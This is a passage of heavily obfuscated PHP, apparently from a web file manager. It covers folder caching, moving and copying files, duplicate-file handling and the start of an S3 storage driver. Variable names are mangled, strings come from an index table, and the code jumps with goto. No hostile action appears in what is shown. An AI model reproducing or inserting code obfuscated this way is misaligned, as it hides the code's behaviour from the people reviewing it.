$ºÉä¿áî[$ÌÑœîßº[636]][] = array($ÌÑœîßº[193], $Ì™íÒ¨®, $ÌÑœîßº[659], short_id($Ì™íÒ¨®)); } if (Input::check($†úú¬µø, $ÌÑœîßº[660])) { $ºÉä¿áî[$ÌÑœîßº[635]][] = array($ÌÑœîßº[193] => $Ì™íÒ¨®, $ÌÑœîßº[97] => $ÌÑœîßº[540], $ÌÑœîßº[452] => str_replace($ÌÑœîßº[53], $ÌÑœîßº[12], Pinyin::get($†úú¬µø))); $ºÉä¿áî[$ÌÑœîßº[635]][] = array($ÌÑœîßº[193] => $Ì™íÒ¨®, $ÌÑœîßº[97] => $ÌÑœîßº[539], $ÌÑœîßº[452] => Pinyin::get($†úú¬µø, $ÌÑœîßº[661])); } $ºÉä¿áî[$ÌÑœîßº[635]][] = array($ÌÑœîßº[193] => $Ì™íÒ¨®, $ÌÑœîßº[97] => $ÌÑœîßº[519], $ÌÑœîßº[452] => KodSort::makeStr($†úú¬µø)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($„×Ñ„æ) { $£ëÒŞÜÒ =& $_SERVER[¡¬ıÜ ƒ]; $³­ŒÇûÜ = $this->sourceInfo($„×Ñ„æ); $€ËÉ†®ä = $£ëÒŞÜÒ[662]; $¨›ˆ•÷Ã = array($£ëÒŞÜÒ[586] => array($£ëÒŞÜÒ[617], $³­ŒÇûÜ[$£ëÒŞÜÒ[586]] . $„×Ñ„æ . $£ëÒŞÜÒ[618]), $£ëÒŞÜÒ[507] => $this->targetIsDelete); $Æë²íØ« = $this->field($€ËÉ†®ä)->where($¨›ˆ•÷Ã)->select(); if (!$Æë²íØ«) { return; } $Æë²íØ« = array_to_keyvalue($Æë²íØ«, $£ëÒŞÜÒ[193]); foreach ($Æë²íØ« as $–åüòåÀ) { $æ¸ïÂ°è = $–åüòåÀ[$£ëÒŞÜÒ[192]]; $„×Ñ„æ = $–åüòåÀ[$£ëÒŞÜÒ[193]]; if (!isset($this->_childrenListCache[$„×Ñ„æ]) && $–åüòåÀ[$£ëÒŞÜÒ[487]] == $£ëÒŞÜÒ[91]) { $this->_childrenListCache[$„×Ñ„æ] = array(); } if (!isset($this->_childrenListCache[$æ¸ïÂ°è])) { $this->_childrenListCache[$æ¸ïÂ°è] = array(); } $this->_childrenListCache[$æ¸ïÂ°è][$„×Ñ„æ] = $–åüòåÀ; $this->_childrenItemCache[$„×Ñ„æ] = $–åüòåÀ; } } private function _childrenListAll($ËÕı˜, &$ÃªÑ’öÚ) { $ÃÑ×‡Ö =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->_childrenListCache[$ËÕı˜])) { return; } $®¢ö¶Ä¤ = $this->_childrenListCache[$ËÕı˜]; foreach ($®¢ö¶Ä¤ as $ƒÂïÆß€ => $ş°´«¡±) { $ÃªÑ’öÚ[$ƒÂïÆß€] = $ş°´«¡±; if ($ş°´«¡±[$ÃÑ×‡Ö[487]] == $ÃÑ×‡Ö[91]) { $this->_childrenListAll($ƒÂïÆß€, $ÃªÑ’öÚ); } } } private function sourceInfoCache($µ×Ä¥ó) { if (isset($this->_childrenItemCache[$µ×Ä¥ó])) { return $this->_childrenItemCache[$µ×Ä¥ó]; } return $this->sourceInfo($µ×Ä¥ó); } private function _childrenList($Ãõ“ÉÂ) { if (isset($this->_childrenListCache[$Ãõ“ÉÂ])) { return $this->_childrenListCache[$Ãõ“ÉÂ]; } return $this->_childrenListSelect($Ãõ“ÉÂ); } private function _childrenListSelect($ıİ…û¯ô) { $Á¥ÎÎÛ =& $_SERVER[¡¬ıÜ ƒ]; $éöóÊ¥É = array($Á¥ÎÎÛ[192] => $ıİ…û¯ô, $Á¥ÎÎÛ[507] => $this->targetIsDelete); $ß‘—Ï = $this->where($éöóÊ¥É)->select(); $ß‘—Ï = $ß‘—Ï ? $ß‘—Ï : array(); $ºÚ•ÕÆ = array_to_keyvalue($ß‘—Ï, $Á¥ÎÎÛ[193]); $this->_childrenListCache[$ıİ…û¯ô] = $ºÚ•ÕÆ; foreach ($ºÚ•ÕÆ as $ıİ…û¯ô => $‰Ú¤èü›) { $this->_childrenItemCache[$ıİ…û¯ô] = $‰Ú¤èü›; } return $ºÚ•ÕÆ; } private function fileNameExistAuto($¨²ßí, $ñÜüõ€½) { $²’±Õ¯Ò =& $_SERVER[¡¬ıÜ ƒ]; if ($ñÜüõ€½[$²’±Õ¯Ò[507]] == $²’±Õ¯Ò[91]) { return $this->fileNameExist($¨²ßí, $ñÜüõ€½[$²’±Õ¯Ò[32]]); } return $this->fileNameExistCache($¨²ßí, $ñÜüõ€½[$²’±Õ¯Ò[32]]); } private function fileNameExistCache($øéò§ÁÀ, $‘¼’ÏĞ•) { $èÎùìÖ– =& $_SERVER[¡¬ıÜ ƒ]; $‘¼’ÏĞ• = strtolower($‘¼’ÏĞ•); $ÛÂÔñ±Ş = $this->_childrenList($øéò§ÁÀ); foreach ($ÛÂÔñ±Ş as $èÄğš¨Ï) { if ($‘¼’ÏĞ• == strtolower($èÄğš¨Ï[$èÎùìÖ–[32]])) { return $èÄğš¨Ï[$èÎùìÖ–[193]]; } } return !1; } private function fileNameAutoCache($È¨®ÈÍş, $™áã³Á, $¬ï‰İÕŒ, $°´ùß§) { $üñÉæ™Š =& $_SERVER[¡¬ıÜ ƒ]; $¨ğ±ü® = $this->_childrenList($È¨®ÈÍş); $¢¥Á§Œ  = array_to_keyvalue($¨ğ±ü®, $üñÉæ™Š[12], $üñÉæ™Š[32]); return $this->fileNameAutoGet($¢¥Á§Œ , $™áã³Á, $¬ï‰İÕŒ, $°´ùß§); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($í´ÊÛì, $¶„Ş’™ş, $‰ÂŸŞ³ = REPEAT_REPLACE, $¥ÕŒŞ§ = '') { $åŠ­Ûàå =& $_SERVER[¡¬ıÜ ƒ]; $»½Ê›£ = $this->sourceInfo($í´ÊÛì); $¾ïİöˆ = $this->sourceInfo($¶„Ş’™ş); if ($»½Ê›£[$åŠ­Ûàå[192]] == $¾ïİöˆ[$åŠ­Ûàå[193]]) { if ($»½Ê›£[$åŠ­Ûàå[507]] == $åŠ­Ûàå[91]) { Model($åŠ­Ûàå[505])->restore(array($í´ÊÛì)); } if (!$¥ÕŒŞ§ || $¥ÕŒŞ§ == $»½Ê›£[$åŠ­Ûàå[32]]) { return $í´ÊÛì; } } $îçüÅíÜ = $this->pathInfoMore($í´ÊÛì); if ($this->isParentOf($í´ÊÛì, $¶„Ş’™ş)) { return !1; } if (!$»½Ê›£ || !$¾ïİöˆ || $¾ïİöˆ[$åŠ­Ûàå[487]] != $åŠ­Ûàå[91]) { return !1; } Hook::trigger($åŠ­Ûàå[663], $îçüÅíÜ); $this->targetIsDelete = intval($»½Ê›£[$åŠ­Ûàå[507]]); if ($»½Ê›£[$åŠ­Ûàå[192]] == $¶„Ş’™ş && $¥ÕŒŞ§ != $»½Ê›£[$åŠ­Ûàå[32]]) { $¦ÇšİƒÜ = $this->fileNameExist($¶„Ş’™ş, $¥ÕŒŞ§); if ($¦ÇšİƒÜ && $»½Ê›£[$åŠ­Ûàå[487]] == $åŠ­Ûàå[230]) { $ ºÃëä = $this->sourceInfo($¦ÇšİƒÜ); $‘¯¬šº³ = $this->fileHistory($ ºÃëä, $»½Ê›£[$åŠ­Ûàå[543]], $»½Ê›£[$åŠ­Ûàå[79]]); if (!$‘¯¬šº³) { Model($åŠ­Ûàå[546])->remove($»½Ê›£[$åŠ­Ûàå[543]]); } $this->removeNow($í´ÊÛì, !1); $this->folderSizeReset($¶„Ş’™ş); Hook::trigger($åŠ­Ûàå[664], $îçüÅíÜ); return $¦ÇšİƒÜ; } } $Š‹ĞëõÅ = $¥ÕŒŞ§ ? $¥ÕŒŞ§ : $»½Ê›£[$åŠ­Ûàå[32]]; $this->lockMoveStart($í´ÊÛì); $this->lockWriteStart($¶„Ş’™ş, $Š‹ĞëõÅ); $Áß¹°öá = array($åŠ­Ûàå[634] => array(), $åŠ­Ûàå[665] => !1); $this->clearShare($í´ÊÛì, $¶„Ş’™ş); $²Òº“©Œ = $this->fileNameExistAuto($¶„Ş’™ş, $»½Ê›£); $õ©Õ®Õ¸ = $this->_move($í´ÊÛì, $¶„Ş’™ş, $‰ÂŸŞ³, $Áß¹°öá, $¥ÕŒŞ§); $this->sourceCacheClear(); if ($»½Ê›£[$åŠ­Ûàå[487]] == $åŠ­Ûàå[91] && $²Òº“©Œ) { $this->folderSizeResetChildren($õ©Õ®Õ¸); } Model($åŠ­Ûàå[232])->linkAdd($Áß¹°öá[$åŠ­Ûàå[634]]); if ($õ©Õ®Õ¸ && $²Òº“©Œ && $Áß¹°öá[$åŠ­Ûàå[665]]) { $ÕäÃÎÚ = $»½Ê›£[$åŠ­Ûàå[487]] == $åŠ­Ûàå[91] ? $this->_childrenListSelect($í´ÊÛì) : !1; $§À‡—Ë = $ÕäÃÎÚ && count($ÕäÃÎÚ) > 0 ? !0 : !1; $this->removeNow($í´ÊÛì, $§À‡—Ë); } $this->lockMoveEnd($í´ÊÛì); $this->lockWriteEnd($¶„Ş’™ş, $Š‹ĞëõÅ); $this->folderSizeReset($»½Ê›£[$åŠ­Ûàå[192]]); $this->folderSizeReset($¶„Ş’™ş); $°³ìº = array($»½Ê›£[$åŠ­Ûàå[192]], $¶„Ş’™ş); if ($»½Ê›£[$åŠ­Ûàå[487]] == $åŠ­Ûàå[91]) { $°³ìº[] = $í´ÊÛì; } $this->updateModifyTime($°³ìº); Model($åŠ­Ûàå[638])->eventMove($í´ÊÛì, $»½Ê›£[$åŠ­Ûàå[192]], $¶„Ş’™ş); Hook::trigger($åŠ­Ûàå[664], $îçüÅíÜ); return $õ©Õ®Õ¸; } private function _move($Ì¡œ×Ñ, $Ó÷›ù’ô, $Ş®Ä÷ê, &$’ìŠƒ¨…, $àãÎ±¶ = '') { $¹–‘é‚ =& $_SERVER[¡¬ıÜ ƒ]; $’Ñ’³±Æ = $this->sourceInfo($Ì¡œ×Ñ); $û«Ÿº = $’Ñ’³±Æ[$¹–‘é‚[487]] == $¹–‘é‚[91]; $Ô‡Ëö¼ı = $àãÎ±¶ ? $àãÎ±¶ : $’Ñ’³±Æ[$¹–‘é‚[32]]; $´¾õ„” = $this->fileNameExistAuto($Ó÷›ù’ô, $’Ñ’³±Æ); $this->lockMoveStart($Ì¡œ×Ñ); $this->lockWriteStart($Ó÷›ù’ô, $Ô‡Ëö¼ı); if (!$´¾õ„”) { return $this->_moveForce($Ì¡œ×Ñ, $Ó÷›ù’ô, $Ô‡Ëö¼ı); } $ØÛñãƒ = $´¾õ„”; $Ò—ªë³ = !1; if ($û«Ÿº) { if ($Ş®Ä÷ê == REPEAT_RENAME_FOLDER) { $Ô‡Ëö¼ı = $this->fileNameAuto($Ó÷›ù’ô, $Ô‡Ëö¼ı, $Ş®Ä÷ê, $û«Ÿº); $ØÛñãƒ = $this->_moveForce($Ì¡œ×Ñ, $Ó÷›ù’ô, $Ô‡Ëö¼ı); } else { $š†½³¸Ö = $this->_childrenListSelect($Ì¡œ×Ñ); foreach ($š†½³¸Ö as $Â¥¦ÇÃÕ) { $Î§äã­¥ = REPEAT_REPLACE; $this->_move($Â¥¦ÇÃÕ[$¹–‘é‚[193]], $´¾õ„”, $Î§äã­¥, $’ìŠƒ¨…); } $Ò—ªë³ = !0; } } else { if ($Ş®Ä÷ê == REPEAT_RENAME || $Ş®Ä÷ê == REPEAT_RENAME_FOLDER) { $Ô‡Ëö¼ı = $this->fileNameAuto($Ó÷›ù’ô, $Ô‡Ëö¼ı, $Ş®Ä÷ê, $û«Ÿº); $ØÛñãƒ = $this->_moveForce($Ì¡œ×Ñ, $Ó÷›ù’ô, $Ô‡Ëö¼ı); } else { $´ëŒå©± = $this->sourceInfoCache($´¾õ„”); $Ğ§Ú”‰ = $this->fileHistory($´ëŒå©±, $’Ñ’³±Æ[$¹–‘é‚[543]], $’Ñ’³±Æ[$¹–‘é‚[79]]); if ($Ğ§Ú”‰) { $’ìŠƒ¨…[$¹–‘é‚[634]][] = $’Ñ’³±Æ[$¹–‘é‚[543]]; } $Ò—ªë³ = !0; } } if ($Ò—ªë³) { $’ìŠƒ¨…[$¹–‘é‚[665]] = !0; } return $ØÛñãƒ; } private function _moveForce($È¹ÌÛß, $šÂ®–ÒÙ, $úÖğ—Òò) { $Œ•¶ÕÛ´ =& $_SERVER[¡¬ıÜ ƒ]; $‡Ù’ÀöÖ = $this->sourceInfo($È¹ÌÛß); $½¬ĞÃœå = $this->sourceInfo($šÂ®–ÒÙ); $•éÏı™õ = $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[487]] == $Œ•¶ÕÛ´[91]; $ãğıèø = array($Œ•¶ÕÛ´[479] => $½¬ĞÃœå[$Œ•¶ÕÛ´[193]], $Œ•¶ÕÛ´[657] => $½¬ĞÃœå[$Œ•¶ÕÛ´[586]] . $½¬ĞÃœå[$Œ•¶ÕÛ´[193]] . $Œ•¶ÕÛ´[50], $Œ•¶ÕÛ´[653] => $½¬ĞÃœå[$Œ•¶ÕÛ´[190]], $Œ•¶ÕÛ´[654] => $½¬ĞÃœå[$Œ•¶ÕÛ´[571]], $Œ•¶ÕÛ´[656] => USER_ID, $Œ•¶ÕÛ´[496] => $úÖğ—Òò); $ßšÒ‡ãÆ = $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[190]] == SourceModel::TYPE_GROUP && $½¬ĞÃœå[$Œ•¶ÕÛ´[190]] == SourceModel::TYPE_GROUP && $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[571]] == $½¬ĞÃœå[$Œ•¶ÕÛ´[571]]; if (!$ßšÒ‡ãÆ && $this->moveClearAuth) { Model($Œ•¶ÕÛ´[569])->authClear($È¹ÌÛß); } $ùĞëÇ¾À = $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[507]] == $Œ•¶ÕÛ´[91] && $½¬ĞÃœå[$Œ•¶ÕÛ´[507]] != $Œ•¶ÕÛ´[91]; if ($ùĞëÇ¾À) { $ãğıèø[$Œ•¶ÕÛ´[506]] = 0; } if ($•éÏı™õ) { $ïã¼¥›¢ = array($Œ•¶ÕÛ´[657] => array($Œ•¶ÕÛ´[617], $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[586]] . $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[193]] . $Œ•¶ÕÛ´[618])); $îÆ§¨ê = $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[586]] . $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[193]] . $Œ•¶ÕÛ´[50]; $ëÂ¿ï…‘ = $½¬ĞÃœå[$Œ•¶ÕÛ´[586]] . $½¬ĞÃœå[$Œ•¶ÕÛ´[193]] . $Œ•¶ÕÛ´[50] . $‡Ù’ÀöÖ[$Œ•¶ÕÛ´[193]] . $Œ•¶ÕÛ´[50]; $£¡ «¯¶ = array($Œ•¶ÕÛ´[657] => array($Œ•¶ÕÛ´[666], "\x72\145\160\x6c\x61\x63\145\x28\x70\x61\x72\145\x6e\164\x4c\145\x76\145\154\x2c\x27{$îÆ§¨ê}\x27\54\x27{$ëÂ¿ï…‘}\47\x29"), $Œ•¶ÕÛ´[653] => $½¬ĞÃœå[$Œ•¶ÕÛ´[190]], $Œ•¶ÕÛ´[654] => $½¬ĞÃœå[$Œ•¶ÕÛ´[571]]); if ($ùĞëÇ¾À) { $£¡ «¯¶[$Œ•¶ÕÛ´[506]] = 0; } $this->where($ïã¼¥›¢)->data($£¡ «¯¶)->save(); } $this->where(array($Œ•¶ÕÛ´[493] => $È¹ÌÛß))->data($ãğıèø)->save(); return $È¹ÌÛß; } private function clearShare($òîÏŠŒº, $¯²‚‚Ìş) { $Üôè„Ó© =& $_SERVER[¡¬ıÜ ƒ]; $Éå¢şÒ© = $this->sourceInfo($òîÏŠŒº); $åÖ¬†÷¿ = $this->sourceInfo($¯²‚‚Ìş); if ($Éå¢şÒ©[$Üôè„Ó©[571]] == $åÖ¬†÷¿[$Üôè„Ó©[571]] && $Éå¢şÒ©[$Üôè„Ó©[190]] == $Üôè„Ó©[667]) { return; } $¿ äøÀ = array($Üôè„Ó©[586] => array($Üôè„Ó©[617], $Éå¢şÒ©[$Üôè„Ó©[586]] . $òîÏŠŒº . $Üôè„Ó©[618])); $ŞÑÈÒ»¶ = $this->field($Üôè„Ó©[493])->where($¿ äøÀ)->getField($Üôè„Ó©[193], !0); if (!$ŞÑÈÒ»¶) { return; } $¿ äøÀ = array($Üôè„Ó©[193] => array($Üôè„Ó©[7], $ŞÑÈÒ»¶), $Üôè„Ó©[668] => 1); $¾Î»“Ô = Model($Üôè„Ó©[669])->field($Üôè„Ó©[670])->where($¿ äøÀ)->select(); if (!$¾Î»“Ô) { return; } $¾Î»“Ô = array_to_keyvalue($¾Î»“Ô, $Üôè„Ó©[12], $Üôè„Ó©[670]); $¿ äøÀ = array($Üôè„Ó©[670] => array($Üôè„Ó©[7], $¾Î»“Ô)); Model($Üôè„Ó©[669])->where($¿ äøÀ)->save(array($Üôè„Ó©[668] => 0)); Model($Üôè„Ó©[671])->where($¿ äøÀ)->delete(); } public function copyFolderFromIO($·‚ù¥¯¿, $ÕÍòÂı®, $‚•£Û±, $èÀÏÄŒæ, $ÕÑ€êæ, $´¤°»‰Ñ = false) { $”×é…í =& $_SERVER[¡¬ıÜ ƒ]; $Ş«¸¦ø¶ = array($”×é…í[635] => array(), $”×é…í[636] => array(), $”×é…í[634] => array(), $”×é…í[672] => array()); $¨š‚Íûé = $´¤°»‰Ñ ? $´¤°»‰Ñ : $·‚ù¥¯¿->pathThis($ÕÍòÂı®); $Òİ÷¯½ó = $this->fileNameExist($‚•£Û±, $¨š‚Íûé); $ã°ÉËà = $this->mkdir($‚•£Û±, $¨š‚Íûé, $èÀÏÄŒæ); if (!$Òİ÷¯½ó || $èÀÏÄŒæ == REPEAT_RENAME_FOLDER) { $èÀÏÄŒæ = !1; } if ($Òİ÷¯½ó) { $this->_childrenAllMake($Òİ÷¯½ó); } Hook::trigger($”×é…í[673]); $this->_copyChildTo($·‚ù¥¯¿, $ÕÍòÂı®, $ã°ÉËà, $èÀÏÄŒæ, $Ş«¸¦ø¶, $ÕÑ€êæ); Hook::trigger($”×é…í[674]); if ($ã°ÉËà) { $this->folderSizeResetChildren($ã°ÉËà); } $this->_childrenListClear(); Model($”×é…í[637])->addAll($Ş«¸¦ø¶[$”×é…í[635]], array(), !0); Model($”×é…í[638])->eventCopy($ã°ÉËà); $this->saveAll($Ş«¸¦ø¶[$”×é…í[636]]); Model($”×é…í[546])->linkAdd($Ş«¸¦ø¶[$”×é…í[634]]); Model($”×é…í[546])->remove($Ş«¸¦ø¶[$”×é…í[672]]); $this->folderSizeReset($‚•£Û±); $this->updateModifyTime($‚•£Û±); return $ã°ÉËà; } private function _copyChildTo($ ğ´äÏ–, $ŠÖœ¸ó«, $˜è§­¨Ã, $ÏÜ, &$×²¬ºµ, $ü†ë¿æº) { $ĞÛ¾•‘÷ =& $_SERVER[¡¬ıÜ ƒ]; $‹‹èŸì = $this->sourceInfoCache($˜è§­¨Ã); $ØÔ®Í† = $ ğ´äÏ–->listPath($ŠÖœ¸ó«); $ØÔ®Í† = $ØÔ®Í† ? $ØÔ®Í† : array($ĞÛ¾•‘÷[86] => array(), $ĞÛ¾•‘÷[85] => array()); $Ëè–¿Á = array_merge($ØÔ®Í†[$ĞÛ¾•‘÷[86]], $ØÔ®Í†[$ĞÛ¾•‘÷[85]]); $ÙÃŒ£¸ = $this->_addFiles($ ğ´äÏ–, $ØÔ®Í†[$ĞÛ¾•‘÷[86]], $ü†ë¿æº); $‡ØìÎè = array(); foreach ($Ëè–¿Á as &$¾ÙØ­ï•) { if (isset($ÙÃŒ£¸[$¾ÙØ­ï•[$ĞÛ¾•‘÷[32]]])) { $¾ÙØ­ï• = $ÙÃŒ£¸[$¾ÙØ­ï•[$ĞÛ¾•‘÷[32]]]; } $¾ÙØ­ï•[$ĞÛ¾•‘÷[487]] = $¾ÙØ­ï•[$ĞÛ¾•‘÷[33]] == $ĞÛ¾•‘÷[78]; $¾ÙØ­ï•[$ĞÛ¾•‘÷[488]] = substr(_get($¾ÙØ­ï•, $ĞÛ¾•‘÷[169], $ĞÛ¾•‘÷[12]), 0, 10); $¾ÙØ­ï•[$ĞÛ¾•‘÷[79]] = _get($¾ÙØ­ï•, $ĞÛ¾•‘÷[79], 0); $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]] = _get($¾ÙØ­ï•, $ĞÛ¾•‘÷[543], 0); if (!isset($¾ÙØ­ï•[$ĞÛ¾•‘÷[675]]) && $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]]) { $×²¬ºµ[$ĞÛ¾•‘÷[672]][] = $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]]; } if ($ÏÜ) { $†ò¨ ´· = $this->fileNameExistCache($˜è§­¨Ã, $¾ÙØ­ï•[$ĞÛ¾•‘÷[32]]); if ($†ò¨ ´·) { if ($¾ÙØ­ï•[$ĞÛ¾•‘÷[487]] || $ÏÜ == REPEAT_SKIP) { continue; } if ($ÏÜ == REPEAT_REPLACE) { $‡ÖŒˆï = $this->sourceInfoCache($†ò¨ ´·); $¥…ç›ô· = $this->fileHistory($‡ÖŒˆï, $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]], $¾ÙØ­ï•[$ĞÛ¾•‘÷[79]]); if ($¥…ç›ô·) { $×²¬ºµ[$ĞÛ¾•‘÷[634]][] = $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]]; } continue; } else { if ($ÏÜ == REPEAT_RENAME) { $¾ÙØ­ï•[$ĞÛ¾•‘÷[32]] = $this->fileNameAutoCache($˜è§­¨Ã, $¾ÙØ­ï•[$ĞÛ¾•‘÷[32]], $ÏÜ, !1); } } } } if (!$¾ÙØ­ï•[$ĞÛ¾•‘÷[487]] && $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]] == 0) { continue; } if (!$¾ÙØ­ï•[$ĞÛ¾•‘÷[487]] && $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]]) { $×²¬ºµ[$ĞÛ¾•‘÷[634]][] = $¾ÙØ­ï•[$ĞÛ¾•‘÷[543]]; } $‡ØìÎè[] = $this->_makeItemData($¾ÙØ­ï•, $‹‹èŸì, $¾ÙØ­ï•[$ĞÛ¾•‘÷[32]]); } unset($¾ÙØ­ï•); if (!empty($‡ØìÎè)) { $this->addAll($‡ØìÎè); $this->_childrenListSelect($˜è§­¨Ã); } $Ñ×ûã›Ï = $this->_childrenList($˜è§­¨Ã); $Ñ×ûã›Ï = array_to_keyvalue($Ñ×ûã›Ï, $ĞÛ¾•‘÷[32]); foreach ($Ëè–¿Á as $¾ÙØ­ï•) { $‡ÖŒˆï = $Ñ×ûã›Ï[$¾ÙØ­ï•[$ĞÛ¾•‘÷[32]]]; $¤•×æÓß = $‡ÖŒˆï[$ĞÛ¾•‘÷[193]]; $this->_copyApplyMeta($‡ÖŒˆï, $×²¬ºµ); if ($¾ÙØ­ï•[$ĞÛ¾•‘÷[33]] == $ĞÛ¾•‘÷[78]) { $¾ÙØ­ï•[$ĞÛ¾•‘÷[87]] = $ ğ´äÏ–->getPathInner($¾ÙØ­ï•[$ĞÛ¾•‘÷[87]]); $this->_copyChildTo($ ğ´äÏ–, $¾ÙØ­ï•[$ĞÛ¾•‘÷[87]], $¤•×æÓß, $ÏÜ, $×²¬ºµ, $ü†ë¿æº); } } } private function _addFiles($àŞİˆ‘¹, $ç‚æŒ…¦, $ÆÕá¤µÕ) { $»Ÿ×¯§Á =& $_SERVER[¡¬ıÜ ƒ]; if (!$ç‚æŒ…¦ || count($ç‚æŒ…¦) == 0) { return array(); } $ÚèÃË¶ = array(); foreach ($ç‚æŒ…¦ as &$¿Ÿ–Ö­Ä) { Hook::trigger($»Ÿ×¯§Á[676], $¿Ÿ–Ö­Ä); $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[87]] = $àŞİˆ‘¹->getPathInner($¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[87]]); $˜¯¸”»¼ = $àŞİˆ‘¹->hashSimple($¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[87]]); $Ò›€ÅÌÈ = $àŞİˆ‘¹->hashMd5($¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[87]]); if (strlen($Ò›€ÅÌÈ) > 10 && !isset($ÚèÃË¶[$Ò›€ÅÌÈ])) { $ÚèÃË¶[$Ò›€ÅÌÈ] = array(); } $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[677]] = $˜¯¸”»¼; $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[549]] = $Ò›€ÅÌÈ; $ÚèÃË¶[$Ò›€ÅÌÈ][] =& $¿Ÿ–Ö­Ä; if (count($ÚèÃË¶[$Ò›€ÅÌÈ]) > 1) { $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[675]] = !0; } Hook::trigger($»Ÿ×¯§Á[678], $¿Ÿ–Ö­Ä); } unset($¿Ÿ–Ö­Ä); $ë´ò»Ø‘ = array($»Ÿ×¯§Á[549] => array($»Ÿ×¯§Á[7], array_keys($ÚèÃË¶))); $ÚÔ›Ìƒ¯ = Model($»Ÿ×¯§Á[679]); $üãÛ’¤¦ = $ÚÔ›Ìƒ¯->where($ë´ò»Ø‘)->select(); $üãÛ’¤¦ = $üãÛ’¤¦ ? $üãÛ’¤¦ : array(); foreach ($üãÛ’¤¦ as $ƒàîÈ‘ä) { if (!isset($ÚèÃË¶[$ƒàîÈ‘ä[$»Ÿ×¯§Á[549]]])) { continue; } $¹†˜›“ƒ = $ÚèÃË¶[$ƒàîÈ‘ä[$»Ÿ×¯§Á[549]]]; foreach ($¹†˜›“ƒ as &$¿Ÿ–Ö­Ä) { $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[543]] = $ƒàîÈ‘ä[$»Ÿ×¯§Á[543]]; $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[675]] = !0; } unset($¿Ÿ–Ö­Ä); } $­¤Øõ’° = array(); foreach ($ç‚æŒ…¦ as $Š”§õ¨€) { Hook::trigger($»Ÿ×¯§Á[680], $Š”§õ¨€); if (isset($Š”§õ¨€[$»Ÿ×¯§Á[675]]) && $Š”§õ¨€[$»Ÿ×¯§Á[675]]) { Hook::trigger($»Ÿ×¯§Á[681], $Š”§õ¨€); continue; } $æê™½›¿ = $àŞİˆ‘¹->getPathInner($Š”§õ¨€[$»Ÿ×¯§Á[87]]); $õ–óëÓ  = $ÚÔ›Ìƒ¯->addFileMake($æê™½›¿, $Š”§õ¨€[$»Ÿ×¯§Á[79]], $Š”§õ¨€[$»Ÿ×¯§Á[677]], $Š”§õ¨€[$»Ÿ×¯§Á[549]], $Š”§õ¨€[$»Ÿ×¯§Á[32]], $ÆÕá¤µÕ); Hook::trigger($»Ÿ×¯§Á[681], $Š”§õ¨€); if (!is_array($õ–óëÓ )) { continue; } $­¤Øõ’°[] = $õ–óëÓ ; } $ÚÔ›Ìƒ¯->addAll($­¤Øõ’°); $ë´ò»Ø‘ = array($»Ÿ×¯§Á[549] => array($»Ÿ×¯§Á[7], array_keys($ÚèÃË¶))); $üãÛ’¤¦ = $ÚÔ›Ìƒ¯->where($ë´ò»Ø‘)->select(); $üãÛ’¤¦ = $üãÛ’¤¦ ? $üãÛ’¤¦ : array(); foreach ($üãÛ’¤¦ as $ƒàîÈ‘ä) { if (!isset($ÚèÃË¶[$ƒàîÈ‘ä[$»Ÿ×¯§Á[549]]])) { continue; } $ÆŒ¯»ÜÚ =& $ÚèÃË¶[$ƒàîÈ‘ä[$»Ÿ×¯§Á[549]]]; foreach ($ÆŒ¯»ÜÚ as &$¿Ÿ–Ö­Ä) { $¿Ÿ–Ö­Ä[$»Ÿ×¯§Á[543]] = $ƒàîÈ‘ä[$»Ÿ×¯§Á[543]]; } unset($¿Ÿ–Ö­Ä); } $ô©É˜œ® = array(); foreach ($ç‚æŒ…¦ as $á³†Àòí) { $ô©É˜œ®[$á³†Àòí[$»Ÿ×¯§Á[32]]] = $á³†Àòí; } return $ô©É˜œ®; } } define($_SERVER[¡¬ıÜ ƒ][682], $_SERVER[¡¬ıÜ ƒ][683]); $taucqiksrn = $_SERVER[¡¬ıÜ ƒ][684]; goto dŒ¡ó¬èë ; F²ãŞêÉË¶: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Óª­ø§õ) { $şòı«÷ =& $_SERVER[¡¬ıÜ ƒ]; parent::__construct($Óª­ø§õ); $´ä·İ¡ª = isset($Óª­ø§õ[$şòı«÷[258]]) && $Óª­ø§õ[$şòı«÷[258]] == $şòı«÷[249] ? $şòı«÷[249] : $şòı«÷[315]; $this->setSignVersion($´ä·İ¡ª); } public function link($¬”âï²ù, $ÇåáşÛò = array()) { return parent::link($¬”âï²ù, $ÇåáşÛò); } public function fileOut($ëÂòÜÊß, $­«®†Íò = false, $İÇÚáÛ’ = false, $´¦üÖ—­ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¡¬ıÜ ƒ][316])) { return parent::fileOutServer($ëÂòÜÊß, $­«®†Íò, $İÇÚáÛ’, $´¦üÖ—­); } parent::fileOut($ëÂòÜÊß, $­«®†Íò, $İÇÚáÛ’, $´¦üÖ—­); } public function fileOutImage($®·‚€°æ, $ã¸àË¶ = 250) { if (strstr($this->endpoint, $_SERVER[¡¬ıÜ ƒ][316])) { return parent::fileOutImageServer($®·‚€°æ, $ã¸àË¶); } parent::fileOutImage($®·‚€°æ, $ã¸àË¶); } public function fileOutLink($×ıíÃ™ì) { 